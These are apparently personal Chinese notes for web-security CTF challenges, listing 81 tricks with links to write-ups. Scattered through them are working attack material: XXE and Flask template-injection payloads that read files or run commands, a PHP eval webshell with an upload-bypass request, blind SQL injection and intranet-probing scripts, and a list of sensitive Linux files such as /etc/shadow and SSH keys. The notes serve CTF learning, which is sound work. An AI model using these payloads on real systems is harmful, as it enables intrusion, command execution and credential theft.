# Web笔记

越来越认识到什么是“好记性不如烂笔头”。

1. 当网站没有任何提示时，可以去看看一些敏感目录。

例如：

```
/robots.txt
/.git(这个目录有时候可以直接看，有时候会被forbidden。就算被forbidden了也证明这个目录是存在的，考点可能是git泄露。)
/www.zip（有时候会有网站源码）
```

不过这样蒙目录基本没啥用。建议进一步使用工具扫描目录。不过工具不是万能的，会出现漏扫的情况。尝试把线程调低或者手动检查一些简单的。

2. 永远不要忘记查看源代码以及开发者工具。

很多时候提示都会藏在注释里。还有甚者藏在服务器返回的http报文里，console里。这些都可以用chrome查看。network选项中可以记录报文，如果单纯就是看个报文也没必要专门开个bp。还有最重要的，一些php题包含flag后很有可能包含在注释里，网页直接是看不到的。这时候不看源代码错过flag真的太冤了。

3. 要有bp抓包和改包的习惯。

抓包可以最清楚看到发送了什么东西，接收了什么东西。改包是为了让客户端发出去一些非预期内容，测试能不能触发隐藏bug。

4. flask session伪造

[例题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/%E6%8A%BD%E8%80%81%E5%A9%86.md)。这题还有个任意文件下载的考点，也很经典。

5. [php伪协议](https://segmentfault.com/a/1190000018991087)

[例题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1%E7%BA%A7/Web/fileclude.md)。很多时候用来读取源代码，标志函数为include函数系列。注意php://filter伪协议还可以套另一层协议，不一定非要写`php://filter/read=convert.base64-encode/resource=flag.php`这类的，写`php://filter/read=convert.base64-encode/xxx/resource=flag.php`也行，xxx自定，可用于绕过滤。如[这道题](https://blog.csdn.net/mochu7777777/article/details/105204141)。或者大小写混用，不要read也可以:`pHp://filter/convert.baSe64-encode/resource=/flag`。如果base64等关键字符被过滤了，可以考虑双urlencode绕过，如`php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=flag.php`。[例题2](https://blog.csdn.net/m0_56059226/article/details/119758074)，使用zip伪协议，这个协议忽视后缀，不是zip，例如jpg后缀也可以读取。格式为`zip://[压缩文件绝对路径（网站上相对路径也行）]%23[压缩文件内的子文件名（木马）]（#编码为%23，#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码）`。

1. php preg_replace函数/e选项会导致命令执行

这篇[文章](https://xz.aliyun.com/t/2557)讲的很好。[ics-05](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/ics-05.md)是一道关于该漏洞的例题。还有和文章中提到的利用方法思路完全一样的题：[[BJDCTF2020]ZJCTF，不过如此](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.md)。

7. php rce之<?=和反引号的利用。例题：[RCE挑战1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%981.md)

8. php无字母数字rce之自增利用。例题：[RCE挑战2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%982.md)
9. xml基本xxe利用。例题：[[NCTF2019]Fake XML cookbook](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BNCTF2019%5DFake%20XML%20cookbook.md)。注意[svg文件](https://baike.baidu.com/item/SVG%E6%A0%BC%E5%BC%8F/3463453)也是基于xml开发的，同样也有xxe。例题:[[BSidesCF 2019]SVGMagic](https://blog.csdn.net/shinygod/article/details/124052707)
```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY flag SYSTEM  "file:///flag.txt">
]>
<user>
	<name>&flag;</name>
</user>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```
10. shell命令执行常见[绕过](https://blog.51cto.com/m0re/3879244)
11. [md5碰撞](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)。这是一些hex编码下内容不同却能产生相同md5值的字符串。
12. 一些在黑名单过滤时可互相交换的命令
- 查看目录
> ls<Br>dir
- 输出文件内容
> cat<br>[sort](https://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html)。sort本是排序命令，但是默认会把执行后的结果输出到终端。<Br>[tail](https://www.runoob.com/linux/linux-comm-tail.html)，默认显示文件尾部的内容。由于flag文件基本不会超过十行，所以作用差不多<br>tac，倒序输出文件内容
1.  ssti（模板注入）。这张简单但是经典的表说明当出现ssti时如何测试是什么模板。

![ssti_test](../../CTF/BUUCTF/images/Pasted-1-768x458.png)

模板注入分很多种，慢慢积累。

- [twig](https://xz.aliyun.com/t/10056#toc-13)(php)
- [smarty](https://www.anquanke.com/post/id/272393)(php)
- [flask](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/shrine.md)(python)。例题1:[[GYCTF2020]FlaskApp](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BGYCTF2020%5DFlaskApp.md)。例题2（利用[subprocess.Popen](https://blog.csdn.net/whatday/article/details/109315876)执行命令）:[[CSCCTF 2019 Qual]FlaskLight](https://blog.csdn.net/mochu7777777/article/details/107589811)。命令：`{{''.__class__.__mro__[1].__subclasses__()[395]('ls',shell=True,stdout=-1).communicate()[0].strip()}}`。索引需要爆破：

```python
import requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
for i in range(300,1000):
    url = "http://935b5916-e3d0-4949-80b9-7273c9f46f7b.challenge.ctf.show/hello/{{''.__class__.__mro__[1].__subclasses__()"+f"[{i}]"+"}}"
    res = requests.get(url=url, headers=headers)
    print(res.text)
    if 'Popen' in res.text:
        print(i)
        break 
```

  - 当flask的{{}}被过滤时，可以用{%%}来绕过过滤。例题:[[GWCTF 2019]你的名字](https://blog.csdn.net/cjdgg/article/details/119813547),更多绕过方式可参考[此处](https://blog.csdn.net/miuzzx/article/details/110220425)
  - 最简单的getshell payload(配合eval): `__import__("os").popen("ls").read()`，来源:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
  - 能发现flask注入需要大量`.`,`_`，如果被过滤了可以用`[]`替代`.`，16进制编码替代`_`。例如`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`绕过过滤的写法就是`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`。例题:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)
  - 有时候执行的命令在url里会被截断，可以通过传参的方式解决这个问题。`{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("cmd")).read()}}ge?cmd=cat /flag `

- [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

1.  [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
2.  php md5相关特性。
- md5原始二进制利用+0e绕过md5弱等于+数组绕过md5强等于：[Easy MD5](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/Easy%20MD5.md)。
- 一个0e开头且其md5值也是0e开头的字符串，可用于弱等于：`0e215962017`
1.  php 5 intval特性：intval会截断科学计数法下的字符串，但当以科学计数法表示的字符串进行运算后便不会截断，会返回其运算后的值。例题：[[WUSTCTF2020]朴实无华](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
2.  githacker基本命令
- githacker --url http://example.com/.git --output-folder ./output

1.  多文件内寻找可用shell脚本。今天遇见一道题，整个网站全是后门文件，然而只有一个是有用的。算是fuzz题的变种，可以用以下多线程脚本找到。

```python
import os
import requests
import re
import threading
import time

print('开始时间： '+ time.asctime(time.localtime(time.time()))) 
s1 = threading.Semaphore(100)
filePath = r"src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('tring  '+file+'   '+time.asctime(time.localtime(time.time())))
    with open(file,encoding='utf-8') as f:
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]',f.read()))
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]',f.read()))
    data = {}
    params = {}
    for m in gets:
        params[m] = "echo '123456';"
    for n in posts:
        data[n] = "echo '123456';"
    url = "此处填本地网站地址" +file  #远程的也能post和get到，但是不知道为啥fuzz不出来
    req = session.post(url,data=data,params=params)
    req.close()
    req.encoding = 'utf-8'
    content=req.text
    if '123456' in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '123456';")
            content =req.text
            req.close()
            if "123456" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '123456';"})
                content =req.text
                req.close()
                if "123456" in content:
                    break
        if flag == 1:
            params = a
        else:
            params = b
        print('找到了利用文件： ' + file +"  and 找到了利用的参数：%s" %params)
        print('结束时间： '+time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content,args=(i,))
    t.start()
```

题目及来源：[[强网杯 2019]高明的黑客](https://blog.csdn.net/qq_51684648/article/details/120167176)

19. php extract变量覆盖+反序列化逃逸漏洞。例题:[[安洵杯 2019]easy_serialize_php](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php.md)

20. python unicodedata.numeric 漏洞。例题：[[ASIS 2019]Unicorn shop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BASIS%202019%5DUnicorn%20shop.md)

21. php魔术方法：[官方文档](https://www.php.net/manual/zh/language.oop5.magic.php)。例题：[[MRCTF2020]Ezpop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5DEzpop.md)

22. php [->,=>和::符号详解](https://segmentfault.com/a/1190000008600674)。

23. 命令注入的nmap利用：-oG选项写shell并绕过php escapeshellarg和escapeshellcmd函数。例题：[[BUUCTF 2018]Online Tool](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBUUCTF%202018%5DOnline%20Tool.md)

24. [php特殊标签绕过滤](https://www.cnblogs.com/jinqi520/p/11417365.html)
25. php利用数学函数构造任意shell。例题：[[CISCN 2019 初赛]Love Math](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math.md)
26. 当题目有提到“检查ip”，“只有我自己……”等有关获取ip的内容时，可以考虑是否在xff上做了手脚，比如我们能把xff改为127.0.0.1来伪造本机，甚至是执行模板注入。例题:[[MRCTF2020]PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
27. flag可能会出现在phpinfo界面的Environment里，有时候是因为出题人配置错误，有时候就是这么设计的。例题：[[NPUCTF2020]ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
28. sql注入。

- 在information_schem被ban后的替代注入+[无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)。例题：[[SWPU2019]Web1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSWPU2019%5DWeb1.md)
- updatexml报错注入。例题:[HardSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/HardSQL.md)
- 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
- 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
- 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
  - 在这道题的基础上改动，使其成为通用的mysql布尔盲注脚本。当然改一下if语句的内容也能做延时注入（时间盲注）脚本。
```python
import requests
url="http://62.173.140.174:26001/user.php"
def payload(i, j):
    # 数据库名字
    #sql = f"test'/**/and/**/if(ascii(substr(database(),{i},1))>{j},1,0)#"
    # 表名
    #sql = f"test'/**/and/**/if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='data'),{i},1))>{j}),1,0)#"
    # 列名
    # sql = f"test'/**/and/**/if((ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flags')),{i},1))>{j}),1,0)#"
    # 查询flag
    sql = f"test'/**/and/**/if((ord(substr((select(group_concat(flag))from(flags)),{i},1))>{j}),1,0)#"
    data={'login':sql,'password':'test'}
    r = requests.get(url, params=data)
    if "User" in r.text:
       res = 1
    else:
       res = 0
    return res
def exp():
    flag=""
    for i in range(1, 10000):
        low = 31
        high = 127
        while low <= high:
              mid = (low + high) // 2
              res = payload(i, mid)
              if res:
                 low = mid + 1
              else:
                 high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
           break
        flag += chr(f)
        print(flag)
exp()
```  
- sql正则regexp+二次注入+updatexml报错注入。例题:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
29. php使用读取文件的不同方式，可用于绕过滤。

```php
system("cat /flag");
file_get_contents("/flag");
readfile("/flag");
highlight_file("/flag");
show_source("flag.php")
```

30. MD5hash长度扩展攻击+chrome利用代码添加cookie。例题：[[De1CTF 2019]SSRF Me](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BDe1CTF%202019%5DSSRF%20Me.md)
31. ssi注入漏洞。例题:[[BJDCTF2020]EasySearch](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DEasySearch.md)
32. idna编码+utf-8解码造成的过滤绕过。例题:[[SUCTF 2019]Pythonginx](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSUCTF%202019%5DPythonginx.md)
33. php格式化字符串逃逸+数组绕过strlen检查。例题1:[[0CTF 2016]piapiapia](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B0CTF%202016%5Dpiapiapia.md)；例题2:[baby_unserialize](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Web/baby_unserialize.md)
34. php普通无字母数字getshell+绕过disable functions
35. chrome console发送post请求

[来源](https://cloud.tencent.com/developer/article/1805343)

```js
var url = "http://28401609-7e35-445a-84b7-509187f6de3f.node4.buuoj.cn:81/secrettw.php";

var params = "Merak=a";

var xhr = new XMLHttpRequest();

xhr.open("POST", url, true);

xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 

xhr.onload = function (e) {

  if (xhr.readyState === 4) {

    if (xhr.status === 200) {

      console.log(xhr.responseText);

    } else {

      console.error(xhr.statusText);

    }

  }

};

xhr.onerror = function (e) {

  console.error(xhr.statusText);

};

xhr.send(params);
```

36. PHP会将传参中的空格( )、小数点(.)自动替换成下划线。例题:[[MRCTF2020]套娃](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83.md)
37. 以下代码可传入23333%0a绕过。可以说末尾加个%0a是绕过`^xxx$`这个格式的普遍解法，因为preg_match只能匹配一行数据，无法处理换行符。
```php
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

38.  php pcre回溯限制绕过preg_match。例题:[[FBCTF2019]RCEService](../../CTF/BUUCTF/Web/[FBCTF2019]RCEService.md)
39.  php basename特性+$_SERVER['PHP_SELF']使用+url解析特性。例题:[[Zer0pts2020]Can you guess it?](../../CTF/BUUCTF/Web/[Zer0pts2020]Can%20you%20guess%20it%3F.md)
40.  python pickle反序列化漏洞+jwt爆破secret key。例题:[bilibili](../../CTF/攻防世界/9级/Web/bilibili.md)。pickle也可以用来反弹shell。例题:[[watevrCTF-2019]Pickle Store](https://blog.csdn.net/mochu7777777/article/details/107589233)
41.  python flask模板注入脚本查找subprocess.Popen索引。

[来源](https://blog.csdn.net/mochu7777777/article/details/107589811)

```python
import requests 
import re 
import html 
import time 
index = 0 
for i in range(170, 1000): 
    try: 
        url = "http://e5df30ec-7e81-425e-b1cf-0988f6f9ae6f.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}" 
        r = requests.get(url) 
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text) 
        time.sleep(0.1)
        # print(res) 
        # print(r.text) 
        res = html.unescape(res[0]) 
        print(str(i) + " | " + res) 
        if "subprocess.Popen" in res: 
            index = i 
            break 
    except: 
        continue
print("index of subprocess.Popen:" + str(index))
```

42. 使用[php_mt_seed](https://www.openwall.com/php_mt_seed/)爆破php伪随机数函数[mt_rand](https://www.freebuf.com/vuls/192012.html)种子。例题:[[GWCTF 2019]枯燥的抽奖](https://blog.csdn.net/shinygod/article/details/124067962)
43. linux可读取的敏感文件。

[来源](https://www.shawroot.cc/1007.html)

```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history //root的bash历史记录
/root/.ssh/authorized_keys
/root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts
/opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html
/etc/my.cnf
/etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/proc/config.gz
/proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/proc/mounts // 挂载的文件系统列表
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存,可用于泄露内网网段
/proc/version // 内核版本
//以下文件若不知道PID，用self代替也可以
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell。也有例如flask的题目会把SECRET KEY放里面
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
/proc/self/cmdline //获取当前启动进程的完整命令
/proc/self/mem   //进程的内存内容。注意该文件内容较多而且存在不可读写部分，直接读取会导致程序崩溃。需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。
/proc/self/maps  //当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
/sys/class/net/eth0/address //eth0网卡的MAC地址
```

44. 基础[xxe](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)探测内网网段脚本。

题目及来源:[[NCTF2019]True XML cookbook](https://www.cnblogs.com/Article-kelp/p/16026652.html)

```python
import requests as res
url="http://9b0cf961-6439-461e-862f-882833e83736.node4.buuoj.cn:81/doLogin.php"
rawPayload='<?xml version="1.0"?>'\
         '<!DOCTYPE user ['\
         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
         ']>'\
         '<user>'\
         '<username>'\
         '&payload1;'\
         '</username>'\
         '<password>'\
         '23'\
         '</password>'\
         '</user>'
for i in range(1,256):
    payload=rawPayload.format(i)
    #payload=rawPayload
    print(str("#{} =>").format(i),end='')
    try:
        resp=res.post(url,data=payload,timeout=0.3)
    except:
        continue
    else:
        print(resp.text,end='')
    finally:
        print('')
```

45. php phar反序列化漏洞。例题:[[CISCN2019 华北赛区 Day1 Web1]Dropbox](../../CTF/BUUCTF/Web/[CISCN2019%20华北赛区%20Day1%20Web1]Dropbox.md)
46. php文件上传一句话木马最基础绕过。在木马的开头加上GIF89a，上传文件时抓包改`Content-Type:`为图片。注意木马文件的`Content-Type:`改成什么都没事，重要的是后缀名。如果为了绕过过滤不得不改后缀名，就需要后续找别的漏洞把后缀改回来或者直接包含文件。

```php
GIF89a

<?php @eval($_POST['shell']);?>
````

包如下（仅截取上传部分）：

```
------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="upload_file"; filename="shell.php" //这个名字很重要，保留php后缀名就能直接蚁剑连，否则需要找别的漏洞
Content-Type: image/png //改成png，能绕过过滤的都行

GIF89a

<?php @eval($_POST['shell']);?>

------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryXSmMYBArrqu5ODCM--
```

47. sql注入如果没有过滤load_file，就能直接读取文件。例如：

- ',\`address\`=(select(load_file('/flag.txt')))#

可以直接在不爆表爆字段等任何信息的情况下直接读取到flag.txt文件。

48.  [linux proc/pid/信息说明](https://blog.csdn.net/shenhuxi_yu/article/details/79697792)。/proc/self/cmdline可以读取当前进程执行的命令，如果是python的网站可以借此读取到网站的文件名。linux中如果打开了一个文件且没有关闭的话，`/proc/pid/fd/文件描述符`  这个目录会包含了进程打开的每一个文件，比如/proc/pid/fd/3读取第一个打开的文件。在python里使用open打开的只要不close，都能猜文件描述符而读取到。例题:[[网鼎杯 2020 白虎组]PicDown](https://blog.csdn.net/wuyaowangchuan/article/details/114540227)
49. perl GET命令执行漏洞。例题:[[HITCON 2017]SSRFme](../../CTF/BUUCTF/Web/[HITCON%202017]SSRFme.md)
50. jwt可以通过将alg修改为none来实现无加密伪造。需要使用PyJWT第三方库。例题:[[HFCTF2020]EasyLogin](https://blog.csdn.net/qq_25500649/article/details/118597363)
51. [koa框架结构](https://www.cnblogs.com/wangjiahui/p/12660093.html)。
52. 无列名注入+布尔盲注。例题:[[GYCTF2020]Ezsqli](https://blog.csdn.net/qq_45521281/article/details/106647880)(里面最后一道例题)
53. sql多行二次注入+git目录泄漏+.DS_Store泄露。例题:[comment](../../CTF/攻防世界/7级/Web/comment.md)
54. sql注入中，空格能用内联注释符`/**/`代替；如果注释符`#`被过滤，可以用`;%00`替代，截断注释后面的内容。
55. regexp盲注。例题:[[NCTF2019]SQLi](https://blog.csdn.net/l2872253606/article/details/125265138)
56. [Arjun](https://github.com/s0md3v/Arjun) http参数爆破工具。
57. 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个木马，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破并连接木马就可以getshell。来自[php文件操作trick](https://www.cnblogs.com/tr1ple/p/11301743.html)。更多参考[PHP临时文件机制](https://www.cnblogs.com/linuxsec/articles/11278477.html)。例题:[[NPUCTF2020]ezinclude](https://www.cnblogs.com/Article-kelp/p/14826360.html)
58. 在json中可以使用unicode编码进行转义。如下面两种写法都可以被正确解析。

```
{"poc":"php"}
{"poc":"\u0070\u0068\u0070"}
```

可用于绕过滤。

59. [file_get_contents("php://input")的用法](https://www.cnblogs.com/jiangxiaobo/p/10723031.html)
60. 字符直接和0xFF异或相当于取反。
61. 利用.htaccess文件上传漏洞时，注意php_value auto_append_file的路径可以写php伪协议，这样能用于绕过某些过滤。比如程序过滤了`<?`，我们能够把马base64编码，再上传带有`php_value auto_append_file "php://filter/convert.base64-decode/resource=xxx`的.htaccess文件就能正常使用马了。
62. php绕过exif_imagetype()检测+[open_basedir bypass](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)。例题:[[SUCTF 2019]EasyWeb](../../CTF/BUUCTF/Web/[SUCTF%202019]EasyWeb.md)
63. render_template_string处可能会有python的flask ssti。
64. sql注入逗号被过滤时的绕过[方法](https://www.jianshu.com/p/d10785d22db2)。
65. sql注入弱类型相加。例题:[[网鼎杯2018]Unfinish](https://blog.csdn.net/rfrder/article/details/109352385)
66. 由不安全的SessionId导致的[ThinkPHP6 任意文件操作漏洞](https://paper.seebug.org/1114/)。例题:[[GYCTF2020]EasyThinking](https://blog.csdn.net/mochu7777777/article/details/105160796)
67. php中xxx session内容会被存储到/runtime/session/sess_xxx中。session默认存储文件名是sess_+PHPSESSID
68. php的\$_SERVER['QUERY_STRING']不会对传入键值对进行url解码。
69. php中虽然\$_REQUEST同时接收GET和POST的传参，但POST拥有更高的优先级，当\$_GET和\$_POST中的键相同时，\$_POST的值将覆盖\$_GET的值。
70. php sha1加密数组绕过+extract变量覆盖漏洞+create_function代码注入。例题:[[BJDCTF2020]EzPHP](../../CTF/BUUCTF/Web/[BJDCTF2020]EzPHP.md)
71. 代码执行题可通过输入Error().stack测试后台代码是不是js。
72. js [vm2沙箱逃逸](https://www.anquanke.com/post/id/207291)。例题:[[HFCTF2020]JustEscape](https://blog.csdn.net/SopRomeo/article/details/108629520)
73. web爬虫计算脚本。

[例题及来源](https://blog.csdn.net/qq_46263951/article/details/118914287)

```python
import re
import requests
from time import sleep
def count():
    s = requests.session()
    url = 'http://4cf5d9ba-2df8-4b52-88ff-5fcbd27c5fc9.node4.buuoj.cn:81/'
    match = re.compile(r"[0-9]+ [+|-] [0-9]+")
    r = s.get(url)
    for i in range(1001):
        sleep(0.1)
        str = match.findall(r.text)[0]
        # print(eval(str))
        data = {"answer" : eval(str)}
        r = s.post(url, data=data)
        r.encoding = "utf-8"
        # print(r.text)
    print(r.text)
if __name__ == '__main__':
    count()
```

74. post上传题目fuzz脚本。

[例题及来源](https://blog.csdn.net/mochu7777777/article/details/107729445),这题还有个汉字取反getshell

```python
# -*- coding:utf-8 -*-
# Author: m0c1nu7
import requests

def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list

def upload_post(url):
	str_list = ascii_str()
	for str in str_list:
		header = {
		'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
		}
		post = '''-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

12345'''+str+'''
-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="submit"

提交			
-----------------------------339469688437537919752303518127--'''

		res = requests.post(url,data=post.encode('UTF-8'),headers=header)
		if 'Stored' in res.text:
			print("该字符可以通过:  {0}".format(str))
		else:
			print("过滤字符:  {0}".format(str))
			


if __name__ == '__main__':
	url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
	upload_post(url)
```

75. union select跨库查询+sqlmap的基本使用。例题:[[b01lers2020]Life on Mars](https://blog.csdn.net/mochu7777777/article/details/107725530)
76. 当上传xml遇到waf时，在没有任何提示的情况下，可以尝试将UTF-8编码转为UTF-16编码绕过。
- iconv -f utf8 -t utf-16 1.xml > 2.xml
77. ruby ERB模板注入+预定义变量。例题:[[SCTF2019]Flag Shop](../../CTF/BUUCTF/Web/[SCTF2019]Flag%20Shop.md)
78. php require_once绕过。例题:[[WMCTF2020]Make PHP Great Again](https://www.anquanke.com/post/id/213235)
79. 巧用函数嵌套绕过滤读文件（利用scandir配合next，current等函数取出文件名）。例题:[[GXYCTF2019]禁止套娃](../../CTF/BUUCTF/Web/[GXYCTF2019]禁止套娃.md)
80. php finfo_file()函数仅识别PNG文件十六进制下的第一行信息，即文件头信息。而getimagesize()函数则会检测更多东西：

```
索引 0 给出的是图像宽度的像素值
索引 1 给出的是图像高度的像素值
索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签
索引 bits 给出的是图像的每种颜色的位数，二进制格式
索引 channels 给出的是图像的通道值，RGB 图像默认是 3
索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header("Content-type: image/jpeg");
```

例题及来源:[[HarekazeCTF2019]Avatar Uploader 1](https://blog.csdn.net/weixin_44037296/article/details/112604812)

81. php使用内置类Exception 和 Error绕过md5和sha1函数。例题:[[极客大挑战 2020]Greatphp](https://blog.csdn.net/LYJ20010728/article/details/117429054)
